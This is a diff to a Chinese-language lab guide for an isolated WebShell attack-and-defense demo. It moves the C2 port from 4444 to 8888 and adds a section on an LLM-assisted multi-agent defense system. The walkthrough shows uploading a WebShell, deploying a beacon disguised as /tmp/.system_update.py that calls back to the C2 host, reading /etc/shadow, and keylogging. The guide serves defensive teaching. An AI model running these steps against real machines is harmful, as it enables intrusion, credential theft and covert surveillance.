@@ -30,11 +30,11 @@
 │  ┌───────────────┐                ┌───────────────────────┐  │
 │  │   攻击者浏览器  │  上传WebShell  │   C2 远控服务           │  │
 │  │   (操作面板)    │ ────────────► │   c2_console.py        │  │
-│  │               │                │   监听: 0.0.0.0:4444   │  │
+│  │               │                │   监听: 0.0.0.0:8888   │  │
 │  │               │  ◄───────────  │   (start-c2.bat)       │  │
 │  └───────────────┘   WebShell页面  └───────────┬───────────┘  │
 └──────────────────────────────────────────────────┼────────────┘
-                                                   │ C2 通信 (TCP 4444)
+                                                   │ C2 通信 (TCP 8888)
                                     192.168.163.1 ←→ 192.168.62.128
 ┌──────────────────────────────────────────────────┼────────────┐
 │           CentOS 7 虚拟机 (192.168.62.128)        │            │
@@ -58,7 +58,7 @@
 **部署分工**：
 | 组件 | 运行位置 | 说明 |
 |------|---------|------|
-| C2 远控服务 + 控制台 | Windows 宿主机 | Python 直接运行，监听 4444 端口 |
+| C2 远控服务 + 控制台 | Windows 宿主机 | Python 直接运行，监听 8888 端口 |
 | 靶机 Web 服务 | CentOS 虚拟机 | Apache+PHP，监听 8080 端口 |
 | 防御智能体 | CentOS 虚拟机 | 监控文件/网络/进程，自动处置 |
 | WebShell 样本 | CentOS 虚拟机 | 供攻击者上传使用 |
@@ -160,7 +160,7 @@ dhclient
 **操作步骤**：
 
 ```bash
-# 开放 Web 服务端口（C2 在宿主机上，靶机不需要开放 4444）
+# 开放 Web 服务端口（C2 在宿主机上，靶机不需要开放 8888）
 firewall-cmd --permanent --add-port=8080/tcp
 firewall-cmd --reload
 
@@ -247,7 +247,7 @@ sudo bash scripts/setup-all.sh
 ║  [C2 - Windows 宿主机]                                ║
 ║  启动C2:      双击 c2-server\start-c2.bat           ║
 ║  或CMD运行:   cd c2-server && python c2_console.py   ║
-║  C2监听:      0.0.0.0:4444                           ║
+║  C2监听:      0.0.0.0:8888                           ║
 ╚══════════════════════════════════════════════════════╝
 ```
 
@@ -300,21 +300,21 @@ python --version
 > 2. 安装时**务必勾选** `Add Python to PATH`
 > 3. 安装完成后重新打开 CMD，再次执行 `python --version` 确认
 
-### 4.2 Windows 防火墙放行 4444 端口
+### 4.2 Windows 防火墙放行 8888 端口
 
 **操作步骤**：
 
 以**管理员身份**打开 CMD，执行：
 
 ```cmd
-netsh advfirewall firewall add rule name="C2-4444" dir=in action=allow protocol=TCP localport=4444
+netsh advfirewall firewall add rule name="C2-8888" dir=in action=allow protocol=TCP localport=8888
 ```
 
 **预期现象**：显示 `确定。`
 
 **验证规则已添加**：
 ```cmd
-netsh advfirewall firewall show rule name="C2-4444"
+netsh advfirewall firewall show rule name="C2-8888"
 ```
 
 > **如果不放行**：CentOS 中的 Beacon 无法连接到 Windows 上的 C2 服务器
@@ -356,7 +356,7 @@ CMD 窗口显示：
 [*] Python: python
 Python 3.x.x
 [*] 工作目录: F:\...\c2-server
-[*] 监听端口: 4444 (所有网卡)
+[*] 监听端口: 8888 (所有网卡)
 ==================================================
   启动 C2 控制台...
 ==================================================
@@ -382,15 +382,15 @@ C2>
 
 在 Windows CMD 中新开一个窗口，执行：
 ```cmd
-netstat -an | findstr 4444
+netstat -an | findstr 8888
 ```
 
 **预期现象**：
 ```
-TCP    0.0.0.0:4444     0.0.0.0:0     LISTENING
+TCP    0.0.0.0:8888     0.0.0.0:0     LISTENING
 ```
 
-> 这表示 C2 服务器正在监听所有网卡的 4444 端口，CentOS 中的 Beacon 可以连接过来
+> 这表示 C2 服务器正在监听所有网卡的 8888 端口，CentOS 中的 Beacon 可以连接过来
 
 ### 4.5 从 CentOS 验证到 C2 的连通性
 
@@ -399,7 +399,7 @@ TCP    0.0.0.0:4444     0.0.0.0:0     LISTENING
 在 CentOS 虚拟机中执行：
 ```bash
 # 测试到 C2 服务器的端口连通性
-python3 -c "import socket; s=socket.socket(); s.settimeout(3); s.connect(('192.168.163.1', 4444)); print('[+] C2 可达'); s.close()"
+python3 -c "import socket; s=socket.socket(); s.settimeout(3); s.connect(('192.168.163.1', 8888)); print('[+] C2 可达'); s.close()"
 ```
 
 **预期现象**：输出 `[+] C2 可达`
@@ -455,7 +455,7 @@ http://192.168.62.128:8080/uploads/webshell.php
 显示 WebShell 控制面板，包含：
 - **系统信息**：显示主机名、用户（apache）、系统版本、IP 地址
 - **命令执行**：命令输入框 + 执行按钮 + 输出区域
-- **C2 Beacon 部署**：C2 地址（默认 `192.168.163.1`）、端口（默认 `4444`）+ 部署按钮
+- **C2 Beacon 部署**：C2 地址（默认 `192.168.163.1`）、端口（默认 `8888`）+ 部署按钮
 
 ### 5.4 执行系统命令（Web 交互）
 
@@ -479,7 +479,7 @@ http://192.168.62.128:8080/uploads/webshell.php
 
 1. 在 WebShell 页面的「C2 Beacon 部署」区域：
    - C2 地址：`192.168.163.1`（默认已填好，指向 Windows 宿主机）
-   - C2 端口：`4444`（默认）
+   - C2 端口：`8888`（默认）
 2. 点击「部署 Beacon (上线)」按钮
 
 **预期现象**：
@@ -490,7 +490,7 @@ WebShell 页面输出区域显示：
     文件路径: /tmp/.system_update.py
     进程 PID: 12345
 
-    Beacon 已在后台运行，正在连接 192.168.163.1:4444
+    Beacon 已在后台运行，正在连接 192.168.163.1:8888
 ```
 
 **同时**，在 Windows 的 C2 控制台窗口中出现：
@@ -498,7 +498,7 @@ WebShell 页面输出区域显示：
 [+] Shell#1 上线: apache@webshell-target (192.168.62.128:xxxxx)
 ```
 
-> **关键观察**：Beacon 从 CentOS 虚拟机（192.168.62.128）主动外联到 Windows 宿主机（192.168.163.1:4444），这是一次真实的跨网络反向连接
+> **关键观察**：Beacon 从 CentOS 虚拟机（192.168.62.128）主动外联到 Windows 宿主机（192.168.163.1:8888），这是一次真实的跨网络反向连接
 
 ### 5.6 通过 C2 远程控制靶机
 
@@ -543,7 +543,7 @@ C2(Shell#1)> cmd id
 C2(Shell#1)> cmd ls -la /tmp
 C2(Shell#1)> cmd cat /etc/shadow
 C2(Shell#1)> cmd uname -a
-C2(Shell#1)> cmd curl http://192.168.163.1:4444
+C2(Shell#1)> cmd curl http://192.168.163.1:8888
 ```
 
 ### 5.7 启动键盘记录
@@ -624,7 +624,7 @@ C2(Shell#1)> keylog off
 ```
 
 **关键观察**：
-- Beacon 从 `192.168.62.128`（CentOS）外联到 `192.168.163.1:4444`（Windows C2）
+- Beacon 从 `192.168.62.128`（CentOS）外联到 `192.168.163.1:8888`（Windows C2）
 - 整个攻击过程中，**无任何防御机制阻止**攻击行为
 - 攻击者在 Windows 上操作 C2 控制台，控制 CentOS 靶机，攻击链路清晰可见
 
@@ -681,7 +681,7 @@ sudo bash start-defense.sh
 
   [*] 启动防御智能体...
   [*] 文件监控启动 监控目录: /var/www/vulnerable/uploads/
-  [*] 网络监控启动 监控 C2 端口: 4444 | C2 IP: 192.168.163.1
+  [*] 网络监控启动 监控 C2 端口: 8888 | C2 IP: 192.168.163.1
   [*] 进程监控启动 监控恶意进程特征
   [*] 防御智能体已启动 (防护默认关闭)
 
@@ -772,11 +772,11 @@ Beacon 进程被立即终止，Windows C2 控制台显示 Shell 离线：
 **预期现象（防御智能体窗口）**：
 ```
 [!!!] 2026-07-16 HH:MM:SS [NETWORK] 检测到 C2 外联通信 [C2端口]
-      详情: 连接: 192.168.62.128:xxxxx -> 192.168.163.1:4444 | 进程: python3
+      详情: 连接: 192.168.62.128:xxxxx -> 192.168.163.1:8888 | 进程: python3
 [*] 已阻断外联 IP 192.168.163.1
 ```
 
-> **关键效果**：防御智能体检测到靶机向 Windows 宿主机 `192.168.163.1:4444` 发起 C2 外联，自动通过 iptables 阻断
+> **关键效果**：防御智能体检测到靶机向 Windows 宿主机 `192.168.163.1:8888` 发起 C2 外联，自动通过 iptables 阻断
 
 iptables 自动添加 DROP 规则，Beacon 无法连接 C2。
 
@@ -863,7 +863,7 @@ Defense(OFF)> on
 | 上传 WebShell | 上传成功 | 文件被自动隔离 |
 | 访问 WebShell | 可执行命令 | 文件不存在 (404) |
 | 部署 Beacon | 后台运行 | 进程被立即终止 |
-| C2 通信 (跨网络) | 持久连接 192.168.163.1:4444 | 网络被 iptables 阻断 |
+| C2 通信 (跨网络) | 持久连接 192.168.163.1:8888 | 网络被 iptables 阻断 |
 | 远程命令执行 | 任意执行 | Beacon 无法连接 |
 | 键盘记录 | 持续窃取 | 进程被检测终止 |
 
@@ -927,8 +927,8 @@ python --version
 # 重新安装 Python，勾选 "Add Python to PATH"
 # 或手动添加 Python 到系统 PATH
 
-# 检查 4444 端口是否被占用
-netstat -ano | findstr 4444
+# 检查 8888 端口是否被占用
+netstat -ano | findstr 8888
 
 # 如果端口被占用，找到进程并结束
 taskkill /PID <进程ID> /F
@@ -940,21 +940,21 @@ taskkill /PID <进程ID> /F
 # 在 CentOS 中测试到 C2 的连通性
 ping -c 3 192.168.163.1
 
-# 测试 4444 端口连通性
-python3 -c "import socket; s=socket.socket(); s.settimeout(3); s.connect(('192.168.163.1', 4444)); print('[+] C2 可达'); s.close()"
+# 测试 8888 端口连通性
+python3 -c "import socket; s=socket.socket(); s.settimeout(3); s.connect(('192.168.163.1', 8888)); print('[+] C2 可达'); s.close()"
 
 # 如果不通，检查：
-# 1. Windows 防火墙是否放行 4444（见第四阶段 4.2）
+# 1. Windows 防火墙是否放行 8888（见第四阶段 4.2）
 # 2. C2 控制台是否正在运行
 # 3. VMware 网络是否正常（双向 ping 测试）
 ```
 
 ```cmd
 :: 在 Windows 中检查防火墙规则
-netsh advfirewall firewall show rule name="C2-4444"
+netsh advfirewall firewall show rule name="C2-8888"
 
 :: 如果规则不存在，重新添加（管理员 CMD）
-netsh advfirewall firewall add rule name="C2-4444" dir=in action=allow protocol=TCP localport=4444
+netsh advfirewall firewall add rule name="C2-8888" dir=in action=allow protocol=TCP localport=8888
 ```
 
 ### A.4 C2 控制台无 Beacon 上线
@@ -968,7 +968,7 @@ ps aux | grep system_update
 ls -la /tmp/.system_update.py
 
 # 手动运行 Beacon 测试
-python3 /opt/webshell/beacon.py 192.168.163.1 4444
+python3 /opt/webshell/beacon.py 192.168.163.1 8888
 ```
 
 ### A.5 键盘记录无数据
@@ -985,7 +985,7 @@ systemctl restart httpd
 ls -la /dev/input/event*
 
 # 手动测试 Beacon 键盘记录
-python3 /opt/webshell/beacon.py 192.168.163.1 4444
+python3 /opt/webshell/beacon.py 192.168.163.1 8888
 # 然后在另一个终端输入内容
 ```
 
@@ -1053,3 +1053,79 @@ sudo bash /root/webshell-attack-defense-system/scripts/reset-env.sh
 | 部署脚本 | CentOS VM | `/root/webshell-attack-defense-system/scripts/` | 靶机部署 + 环境重置 |
 | 隔离目录 | CentOS VM | `/tmp/quarantine/` | 被隔离的可疑文件 |
 | Apache 日志 | CentOS VM | `/var/log/httpd/` | Web 服务日志 |
+
+---
+
+## 进阶：多智能体协作防御 + LLM 大脑
+
+原防御智能体是**写死的静态规则引擎**（命中≥2 即杀、一刀切 kill/DROP），确定性、无推理。
+升级后改为**多智能体协作架构**，真正的"智能"来自 LLM 研判大脑。
+
+### 架构（7 个角色智能体 + 事件总线）
+
+```
+感知层  FileSensor / NetworkSensor / ProcessSensor   ── 只看不动，发 raw.* 事件
+   │
+   ▼
+事件总线 (Event Bus)  ── topic 发布/订阅，线程安全
+   │
+   ▼
+关联层  CorrelatorAgent   ── 滑动窗口把多源信号聚类成 incident（确定性快路径）
+   │
+   ▼
+研判层  TriageAgent       ── LLM 大脑推理(ReAct)，失败自动降级为规则评分
+   │                       （这是"智能体"的智能来源）
+   ▼
+响应层  ResponderAgent    ── 分级响应(告警→隔离→阻断→终止) + 可撤销
+   │
+   ▼
+取证层  ForensicsAgent    ── 证据链报告 + 误报学习回流
+```
+
+**为什么不全交给 LLM**：每秒几十个事件直接喂 LLM 会慢/贵。关联层(规则)先过滤 99%，只把"可疑事件"喂 LLM 研判——这是真实安全 Copilot 的工程范式。
+
+### LLM 大脑部署（Windows 宿主机，镜像 C2 拓扑）
+
+LLM 大脑和 C2 一样跑在 Windows 宿主机，CentOS 研判 Agent 跨网调用 `http://192.168.163.1:11434`。
+
+1. 在 Windows 安装 Ollama：https://ollama.com
+2. 双击 `llm-brain\start-llm-brain.bat`（自动拉取 `qwen2.5:7b`、设 `OLLAMA_HOST=0.0.0.0`、放行 11434 防火墙、启动服务）
+3. 保持窗口开启
+
+> 切换云 API：在 CentOS 设环境变量后启动防御：
+> ```bash
+> export DEFENSE_LLM_BACKEND=cloud
+> export CLOUD_API_URL=https://api.deepseek.com
+> export CLOUD_API_KEY=sk-xxx
+> export CLOUD_MODEL=deepseek-chat
+> ```
+> 无 LLM 时设 `DEFENSE_LLM_BACKEND=disabled`，研判 Agent 自动降级为规则评分，演示不中断。
+
+### 启动多智能体防御
+
+```bash
+# CentOS 上（需 root）
+cd /opt/defense-agent
+sudo bash start-defense.sh
+```
+
+控制台命令：
+| 命令 | 作用 |
+|------|------|
+| `on` / `off` | 开关防护（对比有无防御） |
+| `status` | 查看状态（含 LLM 是否可用） |
+| `incidents` | 列出所有关联事件 |
+| `report [id]` | 查看取证报告（含 LLM 研判依据） |
+| `undo` | 撤销最近一组处置（演示"可撤销"） |
+| `fp <id>` | 标记事件为误报（写入学习，未来降分） |
+
+### 演示亮点
+
+- **可解释**：`report` 显示 LLM 给出的"为什么判它攻击 + kill-chain 阶段 + 置信度"
+- **分级响应**：低置信度仅告警，高置信度才隔离/阻断/终止，不再是"一上传就秒杀"
+- **可撤销**：`undo` 恢复被隔离文件、移除 iptables 阻断
+- **自适应**：`fp` 标记误报后，相似特征未来自动降分（轻量学习）
+- **降级容错**：LLM 大脑未启动也能跑（规则评分），启动后自动切换为 LLM 研判
+
+> 旧版单体防御保留为 `defense_agent_legacy.py` / `defense_console_legacy.py`，可对照"静态规则引擎 vs 多智能体"的差异。
+
